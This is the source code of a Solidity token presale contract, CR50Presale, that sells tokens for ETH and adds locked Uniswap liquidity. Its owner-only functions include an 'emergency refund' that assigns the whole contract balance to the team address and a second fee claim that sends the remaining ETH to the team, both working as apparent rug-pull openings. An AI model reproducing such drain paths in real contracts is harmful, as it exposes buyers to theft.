{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"CR50Presale.sol":{"content":"pragma solidity ^0.6.0;\r\n\r\n//SPDX-License-Identifier: UNLICENSED\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address who) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    function unPauseTransferForever() external;\r\n\r\n    function uniswapV2Pair() external returns (address);\r\n}\r\n\r\ninterface IUNIv2 {\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUnicrypt {\r\n    event onDeposit(address, uint256, uint256);\r\n    event onWithdraw(address, uint256);\r\n\r\n    function depositToken(\r\n        address token,\r\n        uint256 amount,\r\n        uint256 unlock_date\r\n    ) external payable;\r\n\r\n    function withdrawToken(address token, uint256 amount) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\nabstract contract ReentrancyGuard {\r\n    uint256 private constant _NOT_ENTERED = 1;\r\n    uint256 private constant _ENTERED = 2;\r\n    uint256 private _status;\r\n\r\n    constructor() public {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n    modifier nonReentrant() {\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n        _status = _ENTERED;\r\n        _;\r\n        _status = _NOT_ENTERED;\r\n    }\r\n}\r\n\r\ncontract CR50Presale is ReentrancyGuard {\r\n    using SafeMath for uint256;\r\n    IERC20 public CR50;\r\n    address public _burnPool = 0x000000000000000000000000000000000000dEaD;\r\n\r\n    IUNIv2 constant uniswap = IUNIv2(\r\n        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n    );\r\n    IUniswapV2Factory constant uniswapFactory = IUniswapV2Factory(\r\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f\r\n    );\r\n    IUnicrypt constant unicrypt = IUnicrypt(\r\n        0x17e00383A843A9922bCA3B280C0ADE9f8BA48449\r\n    );\r\n\r\n    uint256 public tokensBought;\r\n    bool public isStopped = false;\r\n    bool public teamClaimed = false;\r\n    bool public moonMissionStarted = false;\r\n    bool public isRefundEnabled = false;\r\n    bool public presaleStarted = false;\r\n    uint256 constant teamTokens = 100000 ether;\r\n\r\n    address payable owner;\r\n    address payable constant teamAddr = 0x57ED0562683370c320a74d2EC665Bc2C6A2Ee2B2;\r\n\r\n    address public pool;\r\n\r\n    uint256 public liquidityUnlock;\r\n\r\n    uint256 public ethSent;\r\n    uint256 constant tokensPerETH = 1000;\r\n    uint256 public lockedLiquidityAmount;\r\n    uint256 public timeTowithdrawTeamTokens;\r\n    uint256 public refundTime;\r\n    mapping(address => uint256) ethSpent;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"You are not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n        liquidityUnlock = block.timestamp.add(365 days);\r\n        timeTowithdrawTeamTokens = block.timestamp.add(365 days);\r\n        refundTime = block.timestamp.add(7 days);\r\n    }\r\n\r\n    receive() external payable {\r\n        buyTokens();\r\n    }\r\n\r\n    function SUPER_DUPER_EMERGENCY_ALLOW_REFUNDS_DO_NOT_FUCKING_CALL_IT_FOR_FUN()\r\n        external\r\n        onlyOwner\r\n        nonReentrant\r\n    {\r\n        isRefundEnabled = true;\r\n        ethSpent[teamAddr] = address(this).balance;\r\n        isStopped = true;\r\n    }\r\n\r\n    function getRefund() external nonReentrant {\r\n        require(msg.sender == tx.origin);\r\n        require(\r\n            isRefundEnabled || block.timestamp >= refundTime,\r\n            \"Cannot refund\"\r\n        );\r\n        address payable user = msg.sender;\r\n        uint256 amount = ethSpent[user];\r\n        ethSpent[user] = 0;\r\n        user.transfer(amount);\r\n    }\r\n\r\n    function lockWithUnicrypt() external onlyOwner {\r\n        pool = CR50.uniswapV2Pair();\r\n        IERC20 liquidityTokens = IERC20(pool);\r\n        uint256 liquidityBalance = liquidityTokens.balanceOf(address(this));\r\n        uint256 timeToLuck = liquidityUnlock;\r\n        liquidityTokens.approve(address(unicrypt), liquidityBalance);\r\n\r\n        unicrypt.depositToken{value: 0}(pool, liquidityBalance, timeToLuck);\r\n        lockedLiquidityAmount = lockedLiquidityAmount.add(liquidityBalance);\r\n    }\r\n\r\n    function withdrawFromUnicrypt(uint256 amount) external onlyOwner {\r\n        unicrypt.withdrawToken(pool, amount);\r\n    }\r\n\r\n    function withdrawTeamTokens() external onlyOwner nonReentrant {\r\n        require(teamClaimed);\r\n        require(\r\n            block.timestamp >= timeTowithdrawTeamTokens,\r\n            \"Cannot withdraw yet\"\r\n        );\r\n        CR50.transfer(teamAddr, teamTokens);\r\n    }\r\n\r\n    function setCR50(IERC20 addr) external onlyOwner nonReentrant {\r\n        require(\r\n            CR50 == IERC20(address(0)),\r\n            \"You can set the address only once\"\r\n        );\r\n        CR50 = addr;\r\n    }\r\n\r\n    function startPresale() external onlyOwner {\r\n        presaleStarted = true;\r\n    }\r\n\r\n    function pausePresale() external onlyOwner {\r\n        presaleStarted = false;\r\n    }\r\n\r\n    function buyTokens() public payable nonReentrant {\r\n        require(msg.sender == tx.origin);\r\n        require(presaleStarted == true, \"Presale is paused, do not send ETH\");\r\n        require(CR50 != IERC20(address(0)), \"Main contract address not set\");\r\n        require(!isStopped, \"Presale stopped by contract, do not send ETH\");\r\n        require(msg.value >= 0.1 ether, \"You sent less than 0.1 ETH\");\r\n        require(ethSent <= 400 ether, \"Hard cap reached\");\r\n        require(msg.value.add(ethSent) <= 400 ether, \"Hardcap will be reached\");\r\n        require(\r\n            ethSpent[msg.sender].add(msg.value) <= 10 ether,\r\n            \"You cannot buy more\"\r\n        );\r\n        uint256 tokens = msg.value.mul(tokensPerETH);\r\n        require(\r\n            CR50.balanceOf(address(this)) >= tokens,\r\n            \"Not enough tokens in the contract\"\r\n        );\r\n        ethSpent[msg.sender] = ethSpent[msg.sender].add(msg.value);\r\n        tokensBought = tokensBought.add(tokens);\r\n        ethSent = ethSent.add(msg.value);\r\n        CR50.transfer(msg.sender, tokens);\r\n    }\r\n\r\n    function userEthSpenttInPresale(address user)\r\n        external\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return ethSpent[user];\r\n    }\r\n\r\n    function claimTeamFeeAndAddLiquidity() external onlyOwner {\r\n        if (teamClaimed) {\r\n            require(now > refundTime.add(21 days), \"time limit\");\r\n            teamAddr.transfer(address(this).balance);\r\n        } else {\r\n            uint256 amountETH = address(this).balance.mul(13).div(100);\r\n            teamAddr.transfer(amountETH);\r\n            teamClaimed = true;\r\n            addLiquidity();\r\n        }\r\n    }\r\n\r\n    function addLiquidity() internal {\r\n        uint256 ETH = address(this).balance.mul(85).div(100);\r\n        uint256 tokensForUniswap = ETH.mul(911);\r\n        uint256 tokensToBurn = CR50\r\n            .balanceOf(address(this))\r\n            .sub(tokensForUniswap)\r\n            .sub(teamTokens);\r\n        CR50.unPauseTransferForever();\r\n        CR50.approve(address(uniswap), tokensForUniswap);\r\n        uniswap.addLiquidityETH{value: ETH}(\r\n            address(CR50),\r\n            tokensForUniswap,\r\n            tokensForUniswap,\r\n            ETH,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        if (tokensToBurn > 0) {\r\n            CR50.transfer(_burnPool, tokensToBurn);\r\n        }\r\n        if (!isStopped) isStopped = true;\r\n    }\r\n\r\n    function withdrawLockedTokensAfter1Year(\r\n        address tokenAddress,\r\n        uint256 tokenAmount\r\n    ) external {\r\n        require(block.timestamp >= liquidityUnlock, \"You cannot withdraw yet\");\r\n        IERC20(tokenAddress).transfer(teamAddr, tokenAmount);\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"}}}